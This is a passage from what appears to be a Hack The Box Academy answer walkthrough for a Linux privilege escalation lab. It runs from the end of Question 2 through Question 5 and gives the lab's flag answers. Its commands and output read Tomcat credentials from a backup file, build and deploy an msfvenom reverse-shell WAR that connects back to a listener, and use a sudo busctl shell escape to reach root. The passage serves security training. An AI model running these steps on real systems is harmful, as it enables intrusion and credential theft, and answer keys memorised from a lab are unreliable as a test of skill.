cd ~
sshpass -p 'i_l0ve_s3cur1ty!' ssh barry_adm@dmz1.inlanefreight.local
<SNIP>
```

With the attained password, students need to switch users to `barry` then print out the second flag file "flag2.txt", found in `/home/barry/flag2.txt`:

Code: shell

```shell
su barry
cat /home/barry/flag2.txt 
```

```shell-session
htb-student@nix03:~$ su barry

Password: 
barry@nix03:/home/htb-student$ cat /home/barry/flag2.txt 
LLPE{ch3ck_th0se_cmd_l1nes!}
```

Answer: `LLPE{ch3ck_th0se_cmd_l1nes!}`

# Linux Local Privilege Escalation - Skills Assessment

## Question 3

### "Submit the contents of flag3.txt"

Using the same SSH connection established in the previous question -with the user being `barry`-, students need to use the command `id` to notice that `barry` belongs to the `adm` group:

Code: shell

```shell
id
```

```shell-session
barry@nix03:/home/htb-student$ id

uid=1001(barry) gid=1001(barry) groups=1001(barry),4(adm)
```

Therefore, `barry` can read the files under the directory `/var/log/`; students need to print out the contents of the flag file "flag3.txt", which is in the `/var/log/` directory:

```shell
cat /var/log/flag3.txt
```

```shell-session
barry@nix03:/home/htb-student$ cat /var/log/flag3.txt

LLPE{h3y_l00k_a_fl@g!}
```

Answer: `LLPE{h3y_l00k_a_fl@g!}`

# Linux Local Privilege Escalation - Skills Assessment

## Question 4

### "Submit the contents of flag4.txt"

Using the same SSH connection established in the previous question -with the user being `barry`-, students need to use `netstat` to list open ports, finding 8080 listening:

```shell
netstat -tulpn | grep LISTEN
```

```shell-session
barry@nix03:/home/htb-student$ netstat -tulpn | grep LISTEN

(No info could be read for "-p": geteuid()=1001 but you should be root.)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::8080                 :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::33060                :::*                    LISTEN      -
```

When visiting `http://STMIP:8080/`, students will find `Tomcat` running:

![Linux_Privilege_Escalation_Walkthrough_Image_4.png](https://academy.hackthebox.com/storage/walkthroughs/50/Linux_Privilege_Escalation_Walkthrough_Image_4.png)

Clicking on `manager webapp`, students will be prompted for credentials:

![Linux_Privilege_Escalation_Walkthrough_Image_5.png](https://academy.hackthebox.com/storage/walkthroughs/50/Linux_Privilege_Escalation_Walkthrough_Image_5.png)

Using the SSH session, students need to hunt for the `Tomcat` credentials under the directory `/etc/tomcat9/`, finding `tomcatadm:T0mc@t_s3cret_p@ss!` in `/etc/tomcat9/tomcat-users.xml.bak`:

```shell
cat /etc/tomcat9/tomcat-users.xml.bak | grep "password"
```

```shell-session
barry@nix03:/home/htb-student$ cat /etc/tomcat9/tomcat-users.xml.bak | grep "password"

  you must define such a user - the username and password are arbitrary. It is
  them. You will also need to set the passwords to something appropriate.
 <user username="tomcatadm" password="T0mc@t_s3cret_p@ss!" roles="manager-gui, manager-script, manager-jmx, manager-status, admin-gui, admin-script"/>
```

Subsequently, students need to sign in with `tomcatadm:T0mc@t_s3cret_p@ss!`:

![Linux_Privilege_Escalation_Walkthrough_Image_6.png](https://academy.hackthebox.com/storage/walkthroughs/50/Linux_Privilege_Escalation_Walkthrough_Image_6.png)

After logging to the Application Manager, students will notice that they can upload `.WAR` files:

![Linux_Privilege_Escalation_Walkthrough_Image_7.png](https://academy.hackthebox.com/storage/walkthroughs/50/Linux_Privilege_Escalation_Walkthrough_Image_7.png)

Therefore, students need to upload a malicious `.WAR` file that will send them a reverse shell session from the backend server. Students first need to start an `nc` listener that will catch the reverse shell on the jump host:

```shell
nc -nvlp PWNPO
```

```shell-session
┌─[eu-academy-1]─[10.10.14.228]─[htb-ac413848@htb-7lpyzphcoo]─[~]
└──╼ [★]$ nc -nvlp 9001

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

Then, students need to use `msfvenom`, specifying the payload `java/jsp_shell_reverse_tcp`, `LPORT` to be the port that `nc` is listening on (i.e., `PWNPO`):

```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=PWNIP LPORT=PWNPO -f war -o managerUpdated.war
```

```shell-session
┌─[eu-academy-1]─[10.10.14.228]─[htb-ac413848@htb-7lpyzphcoo]─[~]
└──╼ [★]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.228 LPORT=9001 -f war -o managerUpdated.war

Payload size: 1103 bytes
Final size of war file: 1103 bytes
Saved as: managerUpdated.war
```

Students then need to upload and deploy the malicious `.WAR` file to the Application Manager:

![Linux_Privilege_Escalation_Walkthrough_Image_8.png](https://academy.hackthebox.com/storage/walkthroughs/50/Linux_Privilege_Escalation_Walkthrough_Image_8.png)

![Linux_Privilege_Escalation_Walkthrough_Image_9.png](https://academy.hackthebox.com/storage/walkthroughs/50/Linux_Privilege_Escalation_Walkthrough_Image_9.png)

After deploying it, students need to click on it to notice that the reverse shell connection has been established on the `nc` listener:

![Linux_Privilege_Escalation_Walkthrough_Image_10.png](https://academy.hackthebox.com/storage/walkthroughs/50/Linux_Privilege_Escalation_Walkthrough_Image_10.png)

![Linux_Privilege_Escalation_Walkthrough_Image_11.png](https://academy.hackthebox.com/storage/walkthroughs/50/Linux_Privilege_Escalation_Walkthrough_Image_11.png)

```shell-session
Ncat: Connection from 10.129.76.230.
Ncat: Connection from 10.129.76.230:55938.

whoami
tomcat
```

At last, students need to print out the contents of "flag4.txt", which is in the directory `/var/lib/tomcat9/`:

```shell
cat /var/lib/tomcat9/flag4.txt
```

```shell-session
cat /var/lib/tomcat9/flag4.txt

LLPE{im_th3_m@nag3r_n0w}
```

Answer: `LLPE{im_th3_m@nag3r_n0w}`

# Linux Local Privilege Escalation - Skills Assessment

## Question 5

### "Submit the contents of flag5.txt"

Using the same reverse shell session attained in the previous question as the user `tomcat`, students need to check what programs can be run as `root`, finding the binary `/usr/bin/busctl`:

```shell
sudo -l
```

```shell-session
sudo -l

Matching Defaults entries for tomcat on nix03:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tomcat may run the following commands on nix03:
    (root) NOPASSWD: /usr/bin/busctl
```

To exploit this misconfiguration, students need to refer to the [GTFOBins](https://gtfobins.github.io/gtfobins/busctl/) page for `busctl`:

![Linux_Privilege_Escalation_Walkthrough_Image_12.png](https://academy.hackthebox.com/storage/walkthroughs/50/Linux_Privilege_Escalation_Walkthrough_Image_12.png)

Therefore, all that students require to elevate privileges to `root` is two commands:

```shell
sudo busctl --show-machine
!/bin/sh
```

However, before that, students first need to attain a PTY instead of the current dumb terminal. Afterward, students can exploit the misconfiguration to become `root`:

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
sudo busctl --show-machine
!/bin/bash
```

```shell-session
python3 -c 'import pty;pty.spawn("/bin/bash")'
tomcat@nix03:/var/lib/tomcat9$ sudo busctl --show-machine
sudo busctl --show-machine
WARNING: terminal is not fully functional
-  (press RETURN)!/bin/bash
!//bbiinn//bbaasshh!/bin/bash
root@nix03:/var/lib/tomcat9# cat /root/flag5.txt
cat /root/flag5.txt
LLPE{0ne_sudo3r_t0_ru13_th3m_@ll!}
```

At last, students need to print out the contents of the flag file "flag5.txt", which is under the directory `/root/`:

```shell
cat /root/flag5.txt
```

```shell-session
root@nix03:/var/lib/tomcat9# cat /root/flag5.txt
cat /root/flag5.txt
LLPE{0ne_sudo3r_t0_ru13_th3m_@ll!}
```

Answer: `LLPE{0ne_sudo3r_t0_ru13_th3m_@ll!}`